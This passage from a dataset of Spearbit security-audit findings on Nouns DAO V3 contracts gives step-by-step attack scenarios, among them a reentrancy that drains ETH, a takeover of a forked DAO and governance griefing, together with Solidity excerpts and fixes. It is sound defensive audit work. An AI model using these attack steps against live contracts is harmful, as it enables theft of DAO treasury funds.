Alice is minted 1 forked noun:\n    ```solidity\n    function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {\n        if (msg.sender != escrow.dao()) revert OnlyOriginalDAO();\n        if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            uint256 nounId = tokenIds[i];\n            _mintWithOriginalSeed(to, nounId);\n        }\n    }\n    ```\n\n2. Bob transfers all to attack contract (`cBob`), that joins the DAO with 1 noun. Forked treasury is 2 stETH and 200 ETH, `cBob` and Alice both have 1 noun.\n3. `cBob` calls `quit()` and reenters `NounsDAOV3's joinFork()` on stETH `_beforetokentransfer()` (and nothing else):\n    ```solidity\n    function quit(uint256[] calldata tokenIds) external nonReentrant {\n        checkGovernanceActive();\n        uint256 totalSupply = adjustedTotalSupply();\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n        }\n        for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) {\n            IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]);\n            uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n            bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend);\n            if (!erc20Sent) revert QuitERC20TransferFailed();\n        }\n        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;\n        bool ethSent = timelock.sendETH(msg.sender, ethToSend);\n        if (!ethSent) revert QuitETHTransferFailed();\n        emit Quit(msg.sender, tokenIds);\n    }\n    ```\n4. `cBob` has joined the fork with another noun; stETH transfer concludes. Forked treasury is 2 stETH and 300 ETH, while 1 stETH was just sent to `cBob`.\n5. With `quit()` resumed, `(address(timelock).balance * tokenIds.length) / totalSupply = (300 * 1) / 2 = 150 ETH` is sent to `cBob`:\n    ```solidity\n    function quit(uint256[] calldata tokenIds) external nonReentrant {\n        checkGovernanceActive();\n        uint256 totalSupply = adjustedTotalSupply();\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n        }\n        for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) {\n            IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]);\n            uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n            bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend);\n            if (!erc20Sent) revert QuitERC20TransferFailed();\n        }\n        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;\n        bool ethSent = timelock.sendETH(msg.sender, ethToSend);\n        if (!ethSent) revert QuitETHTransferFailed();\n        emit Quit(msg.sender, tokenIds);\n    }\n    ```\n\n6. Forked treasury is 2 stETH and 150 ETH; `cBob` calls `quit()` again without reentering (say on zero original nouns balance) to obtain 1 stETH and 75 ETH, while the same amount is left for Alice. Bob stole 25 ETH from Alice.\n\nThe attacking function logic can be as simple as `{ quit() as long as there is forkedNoun on my balance, perform joinFork() on the callback as long as there is noun on my balance }`.\n\nAlice lost a part of treasury funds. The scale of the steps above can be increased to drain more significant value in absolute terms. Given the low likelihood and high principal funds loss impact, the severity is set to medium.\n\n## Recommendation\nThe core issue is that state variables, noun total supply, and treasury asset balances, are obtained before and after the external calls. This can be fixed by gathering the state beforehand. For example:\n```solidity\nfunction quit(uint256[] calldata tokenIds) external nonReentrant {\n    checkGovernanceActive();\n    uint256 totalSupply = adjustedTotalSupply();\n    uint256 erc20length = erc20TokensToIncludeInQuit.length;\n    uint256[] memory balances = new uint256[](erc20length + 1);\n    IERC20[] memory erc20tokens = new IERC20[](erc20length);\n    \n    for (uint256 i = 0; i < erc20length; i++) {\n        erc20tokens[i] = IERC20(erc20TokensToIncludeInQuit[i]);\n        balances[i] = erc20tokens[i].balanceOf(address(timelock));\n    }\n    balances[erc20length] = address(timelock).balance;\n\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n        nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n    }\n\n    for (uint256 i = 0; i < erc20length; i++) {\n        uint256 tokensToSend = (balances[i] * tokenIds.length) / totalSupply;\n        bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20tokens[i]), tokensToSend);\n        if (!erc20Sent) revert QuitERC20TransferFailed();\n    }\n\n    uint256 ethToSend = (balances[erc20length] * tokenIds.length) / totalSupply;\n    bool ethSent = timelock.sendETH(msg.sender, ethToSend);\n    if (!ethSent) revert QuitETHTransferFailed();\n    emit Quit(msg.sender, tokenIds);\n}\n```\n\n### Nouns\nFixed in PR 722.\n\n### Spearbit\nThe fix looks good.",
      "summary": "\nA bug report has been filed regarding a vulnerability in the NounsDAOLogicV1Fork.sol#L201-L222 of NounsDAOV3 that can allow for stealing of treasury funds via cross-contract reentrancy. The severity of this bug is considered to be of medium risk.\n\nThe scenario begins with an initiative group of nouns holders performing a fork, claiming and immediately quitting. Bob and Alice, who are not part of the group, are still in the original DAO with Bob holding two nouns and Alice one. Each noun's share of the treasury is 1 stETH and 100 ETH respectively.\n\nThe issue arises if the stETH contract is upgraded and now performs a _beforetokentransfer() callback on every transfer to a destination address as long as it is a contract. Alice then decides to join the fork, after which Bob transfers all to an attack contract (cBob). cBob then calls quit() and reenters NounsDAOV3's joinFork() on stETH _beforetokentransfer(). cBob has now joined the fork with another noun, and the forked treasury is 2 stETH and 300 ETH.\n\nThe attack continues with cBob calling quit() again without reentering, obtaining 1 stETH and 75 ETH from the treasury, leaving the same amount for Alice. Bob has now stolen 25 ETH from Alice, and the forked treasury is now 2 stETH and 150 ETH.\n\nThe recommendation to fix this issue is to gather the state beforehand, by obtaining the state variables, nouns total supply and treasury asset balances, before and after the external calls. This can be done by adding code to the NounsDAOLogicV1Fork.sol#L201-L222. The bug has been fixed in PR 722.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21325",
      "title": "A malicious proposer can update proposal past inattentive voters to sneak in otherwise unacceptable details",
      "impact": "MEDIUM",
      "content": "## Medium Risk Security Issue\n\n## Context\n- **Affected Files:**\n  - `NounsDAOV3Proposals.sol` (Lines: 269-423)\n  - `NounsDAOV3Admin.sol` (Line: 118)\n  - `NounsDAOV3Votes.sol` (Lines: 70-293)\n\n## Description\nUpdatable proposal description and transactions is a new feature being introduced in V3 to improve the user experience (UX) of the proposal flow by allowing proposal editing on-chain. The motivation for this feature, as described in the specification, is:\n\n> \"Proposals get voter feedback almost entirely only once they are on-chain. At the same time, proposers are reluctant to cancel and resubmit their proposals for multiple reasons, e.g., preferring to avoid restarting the proposal lifecycle and thus delay funding.\"\n\nHowever, votes are bound only to the proposal identifier and not to their description (which describes the motivation/intention/usage, etc.) or the transactions (values transferred, contracts/functions of interaction, etc.). Inattentive voters may cast their votes based on a stale proposal's description/transactions, which could have been updated since their initial voting. For example, someone voting \"Yes\" on the initial proposal version may vote \"No\" if they see the updated details.\n\nA very small voting delay (with `MIN_VOTING_DELAY` set to 1 block) may even allow a malicious proposer to sneak in a harmful update at the very end of the updatable period, preventing voters from seeing it in time to adjust their votes. Delays in front-end updating of the proposal details may contribute to this scenario.\n\nA malicious proposer may update a proposal with otherwise unacceptable transactions/description to gain the support of inattentive voters who cast their votes based on earlier, acceptable proposal versions. If the malicious proposal passes, it could result in a significant amount of treasury being transferred to unauthorized receivers for unacceptable reasons.\n\n**Low likelihood + High impact = Medium severity.**\n\n## Recommendation\nIncrease the minimum threshold for voting delay to a reasonable value much greater than the current 1 block (12 seconds), e.g., a few days, which would always (even assuming that the DAO can change voting delay to any allowed value) provide sufficient time for voters to notice/evaluate updated proposal details after the updatable period ends and while the voting period is active. \n\nA more defensive design would be to make the votes binding on proposal descriptions and transactions instead of only the proposal identifier.\n\n## Nouns\n**Won't Fix:**  \nWe think it highly unlikely the DAO will set the voting delay to be very short. The DAO enjoys a multi-day period to make sense of proposals.\n\n**Spearbit:**  \nAcknowledged.",
      "summary": "\nThis bug report is about the new feature of Updatable Proposal Description and Transactions being introduced in the NounsDAOV3 version to improve the UX of the proposal flow. The bug report suggests that a malicious proposer could sneak in a malicious update at the very end of the updatable period, so that voters do not see it on time to change their votes being cast. This could lead to a significant amount of treasury being transferred to unauthorized receivers. The severity of this bug is Medium Risk. \n\nThe recommendation given in the bug report is to increase the minimum threshold for voting delay to a reasonable value much greater than the current 1 block. This would give sufficient time for voters to notice and evaluate updated proposal details after the updatable period ends and voting period is active. Another defensive design proposed is to make the votes binding on the proposal description and transactions instead of just the proposal identifier. \n\nThe bug report has been acknowledged, but the team has decided not to fix it as it is highly unlikely that the DAO will set voting delay to be very short. The DAO currently enjoys a multi-day period it uses to make sense of proposals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21324",
      "title": "A malicious proposer can create arbitrary number of maliciously updatable proposals to significantly grief the protocol",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `NounsDAOV3Proposals.sol#L783-L798`\n- `NounsDAOV3Proposals.sol#L171`\n- `NounsDAOV3Proposals.sol#L818-L823`\n- `NounsDAOV3Proposals.sol#L269-L423`\n\n## Description\n`checkNoActiveProp()` is documented as: \n> \"This is a spam protection mechanism to limit the number of proposals each noun can back.\" \n\nHowever, this mitigation applies to proposer addresses holding Nouns but not the Nouns themselves because `checkNoActiveProp()` relies on checking the state of proposals tracked by the proposer via `latestProposalId = ds.latestProposalIds[proposer]`. A malicious proposer can move (transfer/delegate) their Noun(s) to different addresses to circumvent this mitigation and create proposals from those new addresses to spam. Furthermore, proposal updation in the protocol does not check for the proposer meeting any voting power threshold at the time of updation.\n\nA malicious proposer can create an arbitrary number of proposals, each from a different address by transferring/delegating their Nouns, and then update any/all of them to be malicious. Substantial effort will be required to differentiate all such proposals from the authentic ones and then cancel them, leading to DAO governance DoS griefing.\n\n> Medium likelihood + Medium impact = Medium severity.\n\n## Recommendation\nConsider:\n1. A redesign where proposal creation spam mitigation is not based on the Noun controlling address but the Noun itself.\n2. Adding proposal threshold check for voting power during updation.\n\n## Nouns\n**Won't Fix.** This is a known issue from the launch of Nouns, and is mitigated by canceling proposals once the proposer doesn’t have enough balance to meet the threshold, as well as the vetoer in extreme cases. Such spammy behavior should easily become suspicious and token holders will be ready to cancel all such proposals, same as they are today.\n\nSpecifically, when it comes to obvious spamming, we don’t think the updatable proposals add any meaningful risk. The spammy behavior is the main red flag, and using this new feature with more stealth is already discussed in:\n> \"A malicious proposer can update proposal past inattentive voters to sneak in otherwise unacceptable details.\"\n\n## Spearbit\n**Acknowledged.**",
      "summary": "\nThis bug report is about a vulnerability in the NounsDAOV3Proposals.sol protocol which could allow malicious proposers to create an arbitrary number of proposals from different addresses. This spam protection mechanism is based on the proposer address rather than the Noun itself, which allows the malicious proposer to transfer or delegate their Nouns to different addresses and create proposals from those new addresses to spam. Furthermore, proposal updation in the protocol does not check for the proposer meeting any voting power threshold at the time of updation. This bug has been given a medium severity due to its medium likelihood and medium impact. \n\nThe recommendation for this bug is to consider a redesign where the proposal creation spam mitigation is not based on the Noun controlling address but the Noun itself, and to add a proposal threshold check for voting power during updation. It has been acknowledged that this is a known issue from the launch of Nouns and is mitigated by cancelling proposals once the proposer does not have enough balance to meet the threshold. It has also been acknowledged that when it comes to obvious spamming, the updatable proposals do not add any meaningful risk as the spammy behavior is the main red flag.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21323",
      "title": "Duplicate ERC20 tokens will send a greater than prorata token share leading to loss of DAO funds",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- **NounsDAOV3Admin.sol**: Lines 497-507  \n- **NounsDAOV3Fork.sol**: Lines 224-230  \n- **NounsDAOLogicV1Fork.sol**: Lines 717-721  \n- **NounsDAOLogicV1Fork.sol**: Lines 210-215  \n\n## Description\nThe function `_setErc20TokensToIncludeInFork()` is an admin function for setting ERC20 tokens that are used when splitting funds to a fork. However, there are no sanity checks for duplicate ERC20 tokens in the `erc20tokens` parameter. While STETH is the only ERC20 token applicable for now, it is conceivable that the DAO treasury may include others in the future.\n\nThe same argument applies to `_setErc20TokensToIncludeInQuit()` and members quitting from the fork DAO. Duplicate tokens in the array will send a greater than prorated share of those tokens to the fork DAO treasury in `sendProRataTreasury()` or to the quitting member in `quit()`. This will lead to loss of funds for the original DAO and fork DAO respectively.\n\n**Low likelihood + High impact = Medium severity.**\n\n## Recommendation\nConsider adding a check to filter out any duplicates in the setters or in `sendProRataTreasury()` / `quit()`.\n\n## Nouns\n- **Fix PR**: PR 733.\n- **Spearbit**: Verified that PR 733 fixes this issue as recommended using checks in setters.",
      "summary": "\nThis bug report relates to the NounsDAOV3Admin, NounsDAOV3Fork, NounsDAOLogicV1Fork, and NounsDAOLogicV1Fork smart contracts. The issue is that the _setErc20TokensToIncludeInFork() and _setErc20TokensToIncludeInQuit() functions do not have sanity checks for duplicate ERC20 tokens in the erc20tokens parameter. This could lead to a loss of funds for the original DAO and fork DAO respectively, as a greater than prorata share of those tokens would be sent to the fork DAO treasury in sendProRataTreasury() or to the quitting member in quit(). As the likelihood of this occurring is low but the impact is high, the severity of the bug is classified as medium.\n\nThe recommendation to fix this issue is to add a check to filter out any duplicates in the setters or in sendProRataTreasury() /quit(). The fix has been verified via PR 733, which adds checks in the setters.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21322",
      "title": "Total supply can be low down to zero after the fork, allowing for execution of exploiting proposals from any next joiners",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity: Medium Risk\n\n### Context\n- File: `NounsDAOLogicV1Fork.sol`\n- Lines: 242-305\n\n### Description\nTotal supply can be low down to reaching zero during the forking period, so any holder then entering the forked DAO with `joinFork()` can push manipulating proposals and force all the later joiners either to rage quit or to be exploited.\n\nAs an example, if there is a group of nouns holders that performed the fork for pure financial reasons, all claimed forked nouns and quit. Right after that, it is `block.timestamp < forkingPeriodEndTimestamp`, so `isForkPeriodActive(ds) == true` in the original DAO contract. \n\nAt the same time, the forked token's `adjustedTotalSupply` is zero (all new tokens were sent to timelock):\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L201-L208\nfunction quit(uint256[] calldata tokenIds) external nonReentrant {\n...\nfor (uint256 i = 0; i < tokenIds.length; i++) {\n    nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n}\n```\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L742-L744\nfunction adjustedTotalSupply() public view returns (uint256) {\n    return nouns.totalSupply() - nouns.balanceOf(address(timelock));\n}\n```\n\nAlso, `NounsTokenFork.remainingTokensToClaim() == 0`, so `checkGovernanceActive()` does not revert in the forked DAO contract:\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L346-L349\nfunction checkGovernanceActive() internal view {\n    if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > 0) {\n        revert WaitingForTokensToClaimOrExpiration();\n    }\n}\n```\n\nOriginal DAO holders can enter the new DAO with `joinFork()` only, which will keep `checkGovernanceActive()` non-reverting in the forked DAO contract:\n\n```solidity\n// NounsDAOV3Fork.sol#L139-L158\nfunction joinFork(\n    NounsDAOStorageV3.StorageV3 storage ds,\n    uint256[] calldata tokenIds,\n    uint256[] calldata proposalIds,\n    string calldata reason\n) external {\n...\nfor (uint256 i = 0; i < tokenIds.length; i++) {\n    ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]);\n}\nNounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds);\nemit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);\n}\n```\n\nAs `remainingTokensToClaim` stays zero as `claimDuringForkPeriod()` doesn't affect it:\n\n```solidity\n// NounsTokenFork.sol#L166-L174\nfunction claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {\n    if (msg.sender != escrow.dao()) revert OnlyOriginalDAO();\n    if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n        uint256 nounId = tokenIds[i];\n        _mintWithOriginalSeed(to, nounId);\n    }\n}\n```\n\nIn this situation, both quorum and proposal thresholds will be zero. Proposals can be created with `creationBlock = block.number`, at which only recently joined holders have voting power:\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L242-L305\nfunction propose(\n    address[] memory targets,\n    uint256[] memory values,\n    string[] memory signatures,\n    bytes[] memory calldatas,\n    string memory description\n) public returns (uint256) {\n    checkGovernanceActive();\n    ProposalTemp memory temp;\n    temp.totalSupply = adjustedTotalSupply();\n    temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);\n    require(\n        nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n        'NounsDAO::propose: proposer votes below proposal threshold '\n    );\n    ...\n    newProposal.proposalThreshold = temp.proposalThreshold;\n    newProposal.quorumVotes = bps2Uint(quorumVotesBPS, temp.totalSupply);\n    ...\n    newProposal.creationBlock = block.number;\n}\n```\n\n```solidity\n// DeployDAOV3NewContractsBase.s.sol#L18-L23\ncontract DeployDAOV3NewContractsBase is Script {\n...\n    uint256 public constant FORK_DAO_PROPOSAL_THRESHOLD_BPS = 25; // 0.25%\n    uint256 public constant FORK_DAO_QUORUM_VOTES_BPS = 1000; // 10%\n}\n```\n\nThis will give the first joiner the full power over all the later joiners:\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L577-L589\nfunction castVoteInternal(\n    address voter,\n    uint256 proposalId,\n    uint8 support\n) internal returns (uint96) {\n...\n/// @notice: Unlike GovernerBravo, votes are considered from the block the proposal was created\n/// in order to normalize quorumVotes and proposalThreshold metrics\nuint96 votes = nouns.getPriorVotes(voter, proposal.creationBlock);\n```\n\nSay if Bob, the original nouns DAO holder with 1 noun, joined when total supply was zero, he can create proposals. Regarding these proposals, his only vote will be 100% of the DAO voting power. Bob can create a proposal to transfer all the funds to himself or a hidden malicious one. Fork escrowers can exploit the fork or force late joiners to quit. All the later joiners will not be able to stop this proposal, no matter how big their voting power is, as votes will be counted starting from the block where Bob had 100% of the votes.\n\nAs the scenario above is part of the expected workflow (i.e., all fork initiators can be reasonably expected to quit fast enough), the probability of its occurrence is medium, while the probability of inattentive late joiners being exploited by Bob's proposal is also medium. Therefore, the overall likelihood is low, while the impact is a total loss of funds for such joiners. \n\nGiven the low combined likelihood and high impact, the severity is set to medium.\n\n### Recommendation\nTo achieve stability, the forked DAO needs to secure enough members first. As one of the options, the forking period might need to be concluded prior to any proposals being made in the new DAO. \n\nFor this, consider additionally passing the `forkingPeriodEndTimestamp` to the forked DAO (currently it is only passed to the forked token) and forbidding new proposals until after `forkingPeriodEndTimestamp`. For example:\n\n```solidity\n// NounsDAOStorageV1Fork.sol#L51-L54\n/// @notice The latest proposal for each proposer\nmapping(address => uint256) public latestProposalIds;\nuint256 public delayedGovernanceExpirationTimestamp;\n/// @notice The forking period expiration timestamp, after which new tokens cannot be claimed by the original DAO\nuint256 public forkingPeriodEndTimestamp;\n```\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L164-L193\nfunction initialize(\n    address timelock_,\n    address nouns_,\n    uint256 votingPeriod_,\n    uint256 votingDelay_,\n    uint256 proposalThresholdBPS_,\n    uint256 quorumVotesBPS_,\n    address[] memory erc20TokensToIncludeInQuit_,\n    uint256 delayedGovernanceExpirationTimestamp_,\n    uint256 forkingPeriodEndTimestamp_\n) public virtual {\n    __ReentrancyGuard_init_unchained();\n    ...\n    delayedGovernanceExpirationTimestamp = delayedGovernanceExpirationTimestamp_;\n    forkingPeriodEndTimestamp = forkingPeriodEndTimestamp_;\n}\n```\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L107\nerror WaitingForTokensToClaimOrExpiration();\nerror WaitingForForkPeriodEnd();\n```\n\n```solidity\n// NounsDAOLogicV1Fork.sol#L242-L249\nfunction propose(\n    address[] memory targets,\n    uint256[] memory values,\n    string[] memory signatures,\n    bytes[] memory calldatas,\n    string memory description\n) public returns (uint256) {\n    checkGovernanceActive();\n    if (block.timestamp <= forkingPeriodEndTimestamp) {\n        revert WaitingForForkPeriodEnd();\n    }\n}\n```\n\n### Related Issues\n- Fix implementation: `nounsDAO/nouns-monorepo#717`\n- Spearbit: The fix looks good.",
      "summary": "\nThis bug report is about the Total supply of a forked DAO token decreasing to zero during the forking period, which could potentially give the first joiner of the forked DAO full power over all the later joiners. The bug is caused by the fact that the claimDuringForkPeriod() function does not affect the remainingTokensToClaim() value, so the checkGovernanceActive() check does not revert in the forked DAO contract. \n\nThe bug report also includes a recommendation on how to fix the issue, which is to pass the forkingPeriodEndTimestamp to the forked DAO, and forbid new proposals until the forkingPeriodEndTimestamp has been reached. This would prevent the first joiner from having too much power over the other joiners. \n\nThe severity of the bug is medium, due to the low combined likelihood and high impact of the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21321",
      "title": "Potential Denial of Service (DoS) attack on NounsAuctionHouseFork Contract",
      "impact": "HIGH",
      "content": "## High Risk Severity Report\n\n**Severity:** High Risk  \n**Context:** NounsAuctionHouseFork.sol#L213  \n\n## Description\nThe potential vulnerability arises during the initialization of the `NounsAuctionHouseFork` contract, which is deployed and initialized via the `executeFork()` function when a new fork is created. At this stage, the state variable `startNounId` within the `NounsTokenFork` contract is set corresponding to the `nounId` currently being auctioned in the `NounsAuctionHouse`.\n\nIt should be noted that the `NounsAuctionHouseFork` contract is initially in a paused state and requires a successful proposal to unpause it, thus enabling the minting of new nouns tokens within the fork.\n\nBased on the current structure, an attacker can execute a DoS attack through the following steps:\n\n1. Assume the `executeFork()` threshold is 7 nouns and the attacker owns 8 nouns. The current `nounId` being auctioned is 735.\n2. The attacker places the highest bid for `nounId 735` in the `NounsAuctionHouse` contract and waits for the auction's conclusion.\n3. Once the auction concludes, the attacker calls `escrowToFork()` with his 8 nouns, triggering the `executeFork()` threshold.\n4. Upon invoking `executeFork()`, new fork contracts are deployed. Below is the state of both `NounsAuctionHouseFork` and `NounsAuctionHouse` contracts at this juncture:\n\n   **NounsAuctionHouseFork state:**\n   - `nounId` -> 0\n   - `amount` -> 0\n   - `startTime` -> 0\n   - `endTime` -> 0\n   - `bidder` -> 0x0000000000000000000000000000000000000000\n   - `settled` -> false\n\n   **NounsAuctionHouse state:**\n   - `nounId` -> 735\n   - `amount` -> 50000000000000000000\n   - `startTime` -> 1686014675\n   - `endTime` -> 1686101075\n   - `bidder` -> 0xE6b3367318C5e11a6eED3Cd0D850eC06A02E9b90 (attacker's address)\n   - `settled` -> false\n\n5. The attacker executes `settleCurrentAndCreateNewAuction()` on the `NounsAuctionHouse` contract, thereby acquiring the `nounId 735`.\n6. Following this, the attacker invokes `joinFork()` on the main DAO and joins the fork with `nounId 735`. This action effectively mints `nounId 735` within the fork and subsequently triggers a DoS state in the `NounsAuctionHouseFork` contract.\n7. At a later time, a proposal is successfully passed and the `unpause()` function is called on the `NounsAuctionHouseFork` contract.\n8. A revert occurs when the `_createAuction()` function tries to mint `tokenId 735` in the fork (which was already minted during the `joinFork()` call), thus re-pausing the contract.\n\nMore broadly, this could happen if the buyer of the fork DAO's `startNounId` (and successive ones) on the original DAO (i.e., the first Nouns that get auctioned after a fork is executed) joins the fork with those tokens, even without any malicious intent, before the fork's auction is unpaused by its governance.\n\nApplying delayed governance on the fork DAO makes this timing-based behavior more feasible. One has to buy one or more of the original DAO tokens auctioned after the fork was executed and use them to join the fork immediately.\n\nThe `NounsAuctionHouseFork` contract gets into a DoS state, necessitating a contract update in the `NounsTokenFork` contract to manually increase the `_currentNounId` state variable to restore the normal flow in the `NounsAuctionHouseFork`.\n\n## Severity Assessment\n- **Likelihood:** High, because this scenario is very likely to happen, even unintentionally; it can be triggered by a non-malicious user that just wants to join the fork with a freshly bought Noun from the auction house.\n- **Impact:** Medium, because forking is bricked for at least several weeks until the upgrade proposal passes and is in place. This is not simply having a contract disabled for a period of time; this can be considered a loss of assets for the Forked DAO as well, i.e., imagine that the Forked DAO needs funding immediately. \n\nOn top of this, the contract upgrade would have to be done on the `NounsTokenFork` contract to correct the `_currentNounId` state variable to a valid value and fix the Denial of Service in the `NounsAuctionHouseFork`. Would the fork joiners be willing to perform such a risky update in such a critical contract?\n\n## Recommendations\nConsider one of the below options:\n\n1. Update `NounsTokenFork._currentNounId` in `claimDuringForkPeriod()` if `tokenIds[i] >= _currentNounId` so that fork auctions begin on Nouns that have not been auctioned (and migrated + minted on this fork) on the original DAO yet.\n2. Store the initial `nounId` that is being auctioned when the `executeFork()` function is invoked and then prevent any subsequent calls to the `joinFork()` function with a `nounId` that is equal to or higher than that value. This will ensure that the `_createAuction()` function does not attempt to mint an already minted `tokenId`, thus preventing the contract from getting into a DoS state. However, note that with `MAX_FORK_PERIOD` being 14 days, depending on the duration of delayed governance and status of unclaimed escrow tokens, this could prevent up to 14 auctioned Nouns in the worst case from joining the fork.\n\n**Nouns:**  \nMitigation PR here: [PR 714](#).  \n**Spearbit:** Verified that PR: PR 714 fixes the issue using the first recommendation.",
      "summary": "\nThis bug report outlines a potential vulnerability within the NounsAuctionHouseFork contract, which is deployed and initialized via the executeFork() function when a new fork is created. The vulnerability arises when the attacker owns more than the executeFork() threshold of nouns and is able to acquire the current nounId being auctioned. The attacker then calls escrowToFork() with their nouns, triggering the executeFork() threshold and subsequently minting the nounId within the fork, which results in a Denial of Service state in the NounsAuctionHouseFork contract.\n\nIn order to mitigate this vulnerability, two options were proposed. The first option is to update NounsTokenFork._currentNounId inclaimDuringForkPeriod() if tokenIds[i] >= _currentNounId so that the fork auctions begin on Nouns that have not been auctioned (and migrated+minted on this fork) on the original DAO yet. The second option is to store the initial nounId that is being auctioned when the executeFork() function is invoked, and then prevent any subsequent calls to the joinFork() function with a nounId that is equal to or higher than that value. This will ensure that the _createAuction() function does not attempt to mint an already minted tokenId, thus preventing the contract from getting into a DoS state.\n\nThe mitigation PR for this vulnerability was verified to fix the issue using the first recommendation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21320",
      "title": "Any signer can cancel a pending/active proposal to grief the proposal process",
      "impact": "HIGH",
      "content": "## High Risk Vulnerability Report\n\n### Severity\n**High Risk**\n\n### Context\n- NounsDAOV3Proposals.sol#L560-L589\n- NounsDAOV3Proposals.sol#L813-L821\n\n### Description\nAny proposal signer, besides the proposer, can cancel the proposal later irrespective of the number of votes they contributed earlier towards the threshold. The signer could even have zero votes because `getPriorVotes(signer,..)` is not checked for a non-zero value in `verifySignersCanBackThisProposalAndCountTheirVotes()` as part of the `proposeBySigs()` flow.\n\nThis seems to be a limitation of the design described in [hackmd.io/@el4d/nouns-dao-v3-spec#Cancel](https://hackmd.io/@el4d/nouns-dao-v3-spec#Cancel). With the signature-based scheme, every signer is as powerful as the proposer. As long as their combined votes meet the threshold, it does not matter who contributed how much to the voting power. Assuming everyone contributed some non-zero power, they are all given the cancellation capability. \n\nHowever, for example, a signer/proposer with 0 voting power is treated on par with any other signer who contributed 10 Nouns towards meeting the proposal threshold. A malicious signer can sign off on every valid proposal to later cancel it. The vulnerability arises from a lack of voting power check on the signer and the cancel capability given to any signer.\n\n### Example Scenario\nEvil, without having to own a single Noun, creates a valid signature to back every signature-based proposal from a different account (to bypass `checkNoActiveProp()`) and gets it included in the proposal creation process via `proposeBySigs()`. Evil then cancels every such proposal at will, meaning no signature-based proposal that Evil manages to get included into will ever get executed.\n\n### Impact\nThis allows a malicious griefing signer who could really be anyone without having to own any Nouns but manages to get their signature included in the `proposeBySigs()` to cancel that proposal later. This effectively gives anyone a veto power on all signature-based 